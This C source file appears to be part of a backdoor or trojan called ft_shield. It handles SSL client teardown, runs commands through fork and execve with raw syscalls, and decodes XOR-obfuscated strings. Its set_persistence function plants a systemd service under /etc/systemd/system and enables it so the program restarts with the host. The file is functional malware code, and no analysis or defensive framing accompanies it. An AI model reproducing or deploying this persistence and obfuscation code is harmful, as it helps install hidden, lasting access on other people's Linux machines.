#include "payload.h"

void ft_shutdown(t_args *args) {
    SSL_shutdown(args->ssl);
    SSL_free(args->ssl);
    close(args->client_socket);
    free(args);
}

void run(char *const argv[], const char *path) {
    pid_t pid = fork();

    extern char **environ;
    if (pid == 0) {
        execve(path, argv, environ);
        sc(SYS_exit, EXIT_FAILURE);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
            return;
        }
    }
}

void decode(int *data, char *decoded, int key, int n) {
    memset(decoded, 0, 50);
    for (int i = 0; i < n; i++) {
        decoded[i] = data[i] ^ key;
    }
}

void set_persistence() {
    const char *service_path = "/etc/systemd/system/ft_shield.service";
    int fd = sc(SYS_open ,service_path, O_CREAT | O_RDWR, 0644);
    const char *absolute_path = "/bin/systemctl";
    if (fd < 0) {
        return ;
    }
    sc(SYS_write, fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));


    char *cmd1[] = {"systemctl", "daemon-reexec", NULL};
    char *cmd2[] = {"systemctl", "enable", "/etc/systemd/system/ft_shield.service", NULL};

    run(cmd1, absolute_path);
    run(cmd2, absolute_path);
    sc(SYS_close, fd);
}